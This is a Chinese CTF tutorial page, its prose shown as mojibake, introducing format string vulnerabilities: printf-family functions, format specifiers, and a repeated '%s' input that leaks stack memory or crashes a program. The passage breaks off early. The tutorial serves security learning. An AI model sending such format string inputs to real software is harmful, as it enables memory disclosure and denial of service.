<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨â€”â€”æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´">
<title>PWN-3</title>

<link rel='canonical' href='https://expl0rer.top/p/pwn-3/'>

<link rel="stylesheet" href="/scss/style.min.84f4364fa3a5758ecded3430d054d555b355a8e9efd1baf1e03c18d73802579f.css"><meta property='og:title' content="PWN-3">
<meta property='og:description' content="äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨â€”â€”æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´">
<meta property='og:url' content='https://expl0rer.top/p/pwn-3/'>
<meta property='og:site_name' content='Expl0rer.Ct'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-08T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-11T10:22:24&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/pwn-3/PWN3.png' />
<meta name="twitter:title" content="PWN-3">
<meta name="twitter:description" content="äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨â€”â€”æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://expl0rer.top/p/pwn-3/PWN3.png' />
    <link rel="shortcut icon" href="/favicon.ico" />
<div class="loading">
     
    <div id="ghost">
        <div id="red">
            <div id="pupil"></div>
            <div id="pupil1"></div>
            <div id="eye"></div>
            <div id="eye1"></div>
            <div id="top0"></div>
            <div id="top1"></div>
            <div id="top2"></div>
            <div id="top3"></div>
            <div id="top4"></div>
            <div id="st0"></div>
            <div id="st1"></div>
            <div id="st2"></div>
            <div id="st3"></div>
            <div id="st4"></div>
            <div id="st5"></div>
            <div id="an1"></div>
            <div id="an2"></div>
            <div id="an3"></div>
            <div id="an4"></div>
            <div id="an5"></div>
            <div id="an6"></div>
            <div id="an7"></div>
            <div id="an8"></div>
            <div id="an9"></div>
            <div id="an10"></div>
            <div id="an11"></div>
            <div id="an12"></div>
            <div id="an13"></div>
            <div id="an14"></div>
            <div id="an15"></div>
            <div id="an16"></div>
            <div id="an17"></div>
            <div id="an18"></div>
        </div>
        <div id="shadow"></div>
    </div>
</div>

<style>
    .loading {
        position: fixed;
        display: flex;
        justify-content: center;
        align-items: center;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 99;
        background-color: #f5f5fa;
        transition: opacity 0.5s ease;
    }
	
      
#ghost {
  position: relative;
  scale: 0.8;
}

#red {
  animation: upNDown infinite 1s;
  position: relative;
  width: 140px;
  height: 140px;
  display: grid;
  grid-template-columns: repeat(14, 1fr);
  grid-template-rows: repeat(14, 1fr);
  grid-column-gap: 0px;
  grid-row-gap: 0px;
  grid-template-areas:
    "a1  a2  a3  a4  a5  top0  top0  top0  top0  a10 a11 a12 a13 a14"
    "b1  b2  b3  top1 top1 top1 top1 top1 top1 top1 top1 b12 b13 b14"
    "c1 c2 top2 top2 top2 top2 top2 top2 top2 top2 top2 top2 c13 c14"
    "d1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 d14"
    "e1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 e14"
    "f1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 f14"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "st0 st0 an4 st1 an7 st2 an10 an10 st3 an13 st4 an16 st5 st5"
    "an1 an2 an3 an5 an6 an8 an9 an9 an11 an12 an14 an15 an17 an18";
}

@keyframes upNDown {
  0%,
  49% {
    transform: translateY(0px);
  }
  50%,
  100% {
    transform: translateY(-10px);
  }
}

#top0,
#top1,
#top2,
#top3,
#top4,
#st0,
#st1,
#st2,
#st3,
#st4,
#st5 {
  background-color: red;
}

#top0 {
  grid-area: top0;
}

#top1 {
  grid-area: top1;
}

#top2 {
  grid-area: top2;
}

#top3 {
  grid-area: top3;
}

#top4 {
  grid-area: top4;
}

#st0 {
  grid-area: st0;
}

#st1 {
  grid-area: st1;
}

#st2 {
  grid-area: st2;
}

#st3 {
  grid-area: st3;
}

#st4 {
  grid-area: st4;
}

#st5 {
  grid-area: st5;
}

#an1 {
  grid-area: an1;
  animation: flicker0 infinite 1s;
}

#an18 {
  grid-area: an18;
  animation: flicker0 infinite 1s;
}

#an2 {
  grid-area: an2;
  animation: flicker1 infinite 1s;
}

#an17 {
  grid-area: an17;
  animation: flicker1 infinite 1s;
}

#an3 {
  grid-area: an3;
  animation: flicker1 infinite 1s;
}

#an16 {
  grid-area: an16;
  animation: flicker1 infinite 1s;
}

#an4 {
  grid-area: an4;
  animation: flicker1 infinite 1s;
}

#an15 {
  grid-area: an15;
  animation: flicker1 infinite 1s;
}

#an6 {
  grid-area: an6;
  animation: flicker0 infinite 1s;
}

#an12 {
  grid-area: an12;
  animation: flicker0 infinite 1s;
}

#an7 {
  grid-area: an7;
  animation: flicker0 infinite 1s;
}

#an13 {
  grid-area: an13;
  animation: flicker0 infinite 1s;
}

#an9 {
  grid-area: an9;
  animation: flicker1 infinite 1s;
}

#an10 {
  grid-area: an10;
  animation: flicker1 infinite 1s;
}

#an8 {
  grid-area: an8;
  animation: flicker0 infinite 1s;
}

#an11 {
  grid-area: an11;
  animation: flicker0 infinite 1s;
}

@keyframes flicker0 {
  0%,
  49% {
    background-color: red;
  }
  50%,
  100% {
    background-color: transparent;
  }
}

@keyframes flicker1 {
  0%,
  49% {
    background-color: transparent;
  }
  50%,
  100% {
    background-color: red;
  }
}

#eye {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  left: 10px;
}

#eye::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#eye1 {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  right: 30px;
}

#eye1::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye1::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#pupil {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  left: 10px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

#pupil1 {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  right: 50px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

@keyframes eyesMovement {
  0%,
  49% {
    transform: translateX(0px);
  }
  50%,
  99% {
    transform: translateX(10px);
  }
  100% {
    transform: translateX(0px);
  }
}

#shadow {
  background-color: black;
  width: 140px;
  height: 140px;
  position: absolute;
  border-radius: 50%;
  transform: rotateX(80deg);
  filter: blur(20px);
  top: 80%;
  animation: shadowMovement infinite 1s;
}

@keyframes shadowMovement {
  0%,
  49% {
    opacity: 0.5;
  }
  50%,
  100% {
    opacity: 0.2;
  }
}

</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>

<script>	
    function initLoading() {
        let loading = document.querySelector(".loading");
        document.addEventListener('DOMContentLoaded', function() {
            
            setTimeout(() => {
                loading.style.opacity = "0";
                
                setTimeout(() => {
                    loading.style.display = "none";
                }, 500);
            }, 500); 
        });
    }

    initLoading();
</script>


<link
  rel="stylesheet"
  href="https://cdn-font.hyperos.mi.com/font/css?family=MiSans:400:Chinese_Simplify,Latin&display=swap"
/>



<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreenr.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreenr.css" />


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_1a3c99934e119e1b.png" width="300"
                            height="268" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ«¡</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Expl0rer.Ct</a></h1>
            <h2 class="site-description">å¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://space.bilibili.com/695179979?spm_id_from=333.40138.0.0'
                        target="_blank"
                        title="Bilibili"
                        rel="me"
                    >
                        
                        
                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/Expl0rer-Ct'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ | Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E-about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº | About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£ | Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢ | Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>æŠ€æœ¯é“¾æ¥ | Links</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹æƒ…é“¾æ¥ | Friends Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <!--
tags: [temperature, hot, wheater, thermometer, forecast]
category: Weather
version: "1.73"
unicode: "f236"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#ff9500"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-sun-high"
>
  <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" />
  <path d="M6.343 17.657l-1.414 1.414" />
  <path d="M6.343 6.343l-1.414 -1.414" />
  <path d="M17.657 6.343l1.414 -1.414" />
  <path d="M17.657 17.657l1.414 1.414" />
  <path d="M4 12h-2" />
  <path d="M12 4v-2" />
  <path d="M20 12h2" />
  <path d="M12 20v2" />
</svg>

                        <!--
tags: [night, dark mode]
category: Weather
version: "1.21"
unicode: "ece7"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#8d6e63"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-moon-stars"
>
  <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
  <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2" />
  <path d="M19 11h2m-1 -1v2" />
</svg>

                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#fmtä»‹ç»">FMTä»‹ç»</a></li>
    <li><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†çš„åˆ©ç”¨">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†çš„åˆ©ç”¨</a>
      <ol>
        <li><a href="#æ³„éœ²å†…å­˜æ¡ˆä¾‹">æ³„éœ²å†…å­˜ï¼ˆæ¡ˆä¾‹ï¼‰</a></li>
        <li><a href="#æ³„éœ²æŒ‡å®šåœ°å€">æ³„éœ²æŒ‡å®šåœ°å€</a>
          <ol>
            <li><a href="#32ä½">32ä½</a></li>
            <li><a href="#æ³„éœ²æ ˆä¸Šæ®‹ç•™çš„åœ°å€">æ³„éœ²æ ˆä¸Šæ®‹ç•™çš„åœ°å€</a></li>
            <li><a href="#æ³„éœ²ä»»æ„æŒ‡å®šåœ°å€got-è¡¨">æ³„éœ²ä»»æ„æŒ‡å®šåœ°å€ï¼ˆgot è¡¨ï¼‰</a></li>
            <li><a href="#64ä½">64ä½</a></li>
            <li><a href="#ç¨‹åºäº¤äº’æ¼”ç¤º">ç¨‹åºäº¤äº’æ¼”ç¤º</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#æ•°å­—è¦†ç›–">æ•°å­—è¦†ç›–</a>
      <ol>
        <li><a href="#ä»»æ„åœ°å€å†…å­˜è¦†ç›–">ä»»æ„åœ°å€å†…å­˜è¦†ç›–</a></li>
        <li><a href="#è¦†ç›–å°æ•°å­—">è¦†ç›–å°æ•°å­—</a></li>
        <li><a href="#è¦†ç›–å¤§æ•°å­—">è¦†ç›–å¤§æ•°å­—</a></li>
      </ol>
    </li>
    <li><a href="#gotè¡¨åŠ«æŒ">.gotè¡¨åŠ«æŒ</a>
      <ol>
        <li><a href="#åŠ«æŒæ–¹æ³•">åŠ«æŒæ–¹æ³•</a>
          <ol>
            <li><a href="#fmtstr_payloadå‡½æ•°">fmtstr_payloadå‡½æ•°</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Šçš„åˆ©ç”¨æ–¹å¼">æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Šçš„åˆ©ç”¨æ–¹å¼</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/pwn-3/">
                <img src="/p/pwn-3/PWN3_hu_15c00fd5ce78fdcb.png"
                        srcset="/p/pwn-3/PWN3_hu_15c00fd5ce78fdcb.png 800w, /p/pwn-3/PWN3_hu_e8141183c0993e41.png 1600w"
                        width="800" 
                        height="450" 
                        loading="lazy"
                        alt="Featured image of post PWN-3" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/pwn%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/" style="background-color: #2a9d8f; color: #fff;">
                PWNå‰ç½®çŸ¥è¯†
            </a>
        
            <a href="/categories/ctfpwn/" style="background-color: #2a9d8f; color: #fff;">
                CTFpwn
            </a>
        
            <a href="/categories/ctf%E5%85%A5%E9%97%A8/" >
                CTFå…¥é—¨
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/pwn-3/">PWN-3</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨â€”â€”æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-11-08</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>[TOC]</p>
<p>å‰è¨€ï¼šæœ¬æœŸæœ‰æ‰€å€Ÿé‰´å…¶ä»–åšä¸»çš„è®²è§£èµ„æ–™ï¼Œç›¸è¾ƒå…¶å®ƒç« èŠ‚æ¥è¯´ï¼Œè¿™é‡Œç»™å‡ºçš„ç¤ºä¾‹ä¼šæ¯”è¾ƒå¤šä¸”å®è·µæ€§è¾ƒå¼ºï¼Œå¯ä»¥è·Ÿç€ä¸€èµ·æ¥å¤ç°ã€‚</p>
<p>å†…å®¹æœ‰æ‰€é‡åˆï¼Œå¦‚æœ‰ä¾µæƒéšæ—¶ä¸‹æ¶é‡ç½®ã€‚</p>
<blockquote class="alert alert-warn">
    <blockquote>
<p>å› ä¸ºç¤ºä¾‹æ¼”ç¤ºæœ‰è¿è¡Œpythonè„šæœ¬ï¼Œä¼šæ¶‰åŠpython2ä»£ã€3ä»£ç‰ˆæœ¬çš„åˆ‡æ¢ä½¿ç”¨ï¼Œè®°å¾—æå‰é…ç½®å¥½pythonç‰ˆæœ¬ã€‚</p>
</blockquote></blockquote>
<h2 id="fmtä»‹ç»">FMTä»‹ç»
</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ï¼šå°†è®¡ç®—æœºå†…å­˜ä¸­è¡¨ç¤ºçš„æ•°æ®è½¬åŒ–ä¸ºæˆ‘ä»¬äººç±»å¯è¯»çš„å­—ç¬¦ä¸²æ ¼å¼ã€‚</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>å‡½æ•°</th>
          <th>ä»‹ç»</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>printf</td>
          <td>è¾“å‡ºåˆ°stdout</td>
      </tr>
      <tr>
          <td>fprintf</td>
          <td>è¾“å‡ºåˆ°æŒ‡å®šFILEæµ</td>
      </tr>
      <tr>
          <td>vprintf</td>
          <td>æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºé“stdout</td>
      </tr>
      <tr>
          <td>vfprintf</td>
          <td>æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼è¾“å‡ºé“æŒ‡å®šFILEæµ</td>
      </tr>
      <tr>
          <td>sprintf</td>
          <td>è¾“å‡ºåˆ°å­—ç¬¦ä¸²</td>
      </tr>
      <tr>
          <td>snprintf</td>
          <td>è¾“å‡ºåˆ°æŒ‡å®šå­—èŠ‚æ•°åˆ°å­—ç¬¦ä¸²</td>
      </tr>
      <tr>
          <td>vsprintf</td>
          <td>æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ°å­—ç¬¦ä¸²</td>
      </tr>
      <tr>
          <td>vsnprintf</td>
          <td>æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºæŒ‡å®šå­—èŠ‚åˆ°å­—ç¬¦ä¸²</td>
      </tr>
      <tr>
          <td>setproctitle</td>
          <td>è®¾ç½®argv</td>
      </tr>
      <tr>
          <td>syslog</td>
          <td>è¾“å‡ºæ—¥å¿—</td>
      </tr>
      <tr>
          <td>err,verr,warn,vwarnç­‰</td>
          <td>ã€‚ã€‚ã€‚</td>
      </tr>
  </tbody>
</table></div>
<p>ç”¨printf()ä¸ºä¾‹å­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š</p>
<p><img src="/p/pwn-3/1.png"
	width="664"
	height="148"
	srcset="/p/pwn-3/1_hu_2ee61263459090f6.png 480w, /p/pwn-3/1_hu_70d7a7b51a9df908.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="448"
		data-flex-basis="1076px"
	
></p>
<blockquote>
<p>%d ~ åè¿›åˆ¶â€”â€”è¾“å‡ºåè¿›åˆ¶æ•´æ•°</p>
<p>%s ~ å­—ç¬¦ä¸²â€”â€”ä»å†…å­˜ä¸­è¯»å–å­—ç¬¦ä¸²</p>
<p>%x ~ åå…­è¿›åˆ¶â€”â€”è¾“å‡ºåå…­è¿›åˆ¶æ•°</p>
<p>%c ~ å­—ç¬¦â€”â€”è¾“å‡ºå­—ç¬¦</p>
<p>%p ~ æŒ‡é’ˆâ€”â€”æŒ‡é’ˆåœ°å€</p>
<p>%n ~ åˆ°ç›®å‰ä¸ºæ­¢æ‰€å†™çš„å­—ç¬¦æ•°</p>
</blockquote>
<h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†çš„åˆ©ç”¨">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†çš„åˆ©ç”¨
</h2><p>æ¥çœ‹ä¸€ç§æ”»å‡»æ¡ˆä¾‹ï¼Œæœ€ç®€å•çš„æ”»å‡»æ–¹æ³•ï¼Œåªéœ€è¦è¾“å…¥ä¸€ä¸²%så°±å¯ä»¥</p>
<p>%s%s%s%s%s%s%s%s%s%s%s%s%s%s</p>
<p>å­¦è¿‡Cè¯­è¨€éƒ½çŸ¥é“ï¼Œæ¯ä¸€ä¸ª%sï¼Œä¼šä½¿printf()ä»æ ˆä¸Šå–ä¸€ä¸ªæ•°å­—ï¼ŒæŠŠè¯¥æ•°å­—çœ‹åšæˆåœ°å€ï¼Œæ¥ç€æ‰“å°å‡ºè¯¥åœ°å€æ‰€æŒ‡å‘çš„<strong>å†…å­˜å†…å®¹</strong>ï¼Œè¿™ä¸å°±æ˜¯éš”å±±æ‰“ç‰›å—ï¼Ÿä¸€ä¸ª%så°±èƒ½çªƒå–éš”å£çš„ä¸œè¥¿ï¼Œæœ‰æ—¶è¿™ä¸å¤ªå¯å–ï¼Œä¸‡ä¸€ä½ è·å–çš„æ•°å­—æ˜¯éæ³•åœ°å€ï¼Ÿæ‰€ä»¥æœ‰å¯æ•°å­—å¯¹åº”çš„å†…å®¹å¯èƒ½ä¸å­˜åœ¨ï¼Œæˆ–è€…è¿™ä¸ªåœ°å€è¢«ä¿æŠ¤çš„ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šå› æ­¤å´©æºƒæˆ–è€…åœæ»ä¸å‰ã€‚</p>
<p>åœ¨è¿›å…¥ printf ä¹‹åï¼Œå‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸€ä¸ªä¸€ä¸ªè¯»å–å…¶å­—ç¬¦ä¼šé‡åˆ°ä¸¤ç§æƒ…å†µï¼š</p>
<ul>
<li>å½“å‰å­—ç¬¦ä¸æ˜¯%ï¼Œç›´æ¥è¾“å‡ºåˆ°ç›¸åº”æ ‡å‡†è¾“å‡ºã€‚</li>
<li>å½“å‰å­—ç¬¦æ˜¯%ï¼Œç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦
ä¸€å¦‚æœæ²¡æœ‰å­—ç¬¦ï¼ŒæŠ¥é”™
ä¸€å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯%,è¾“å‡º%
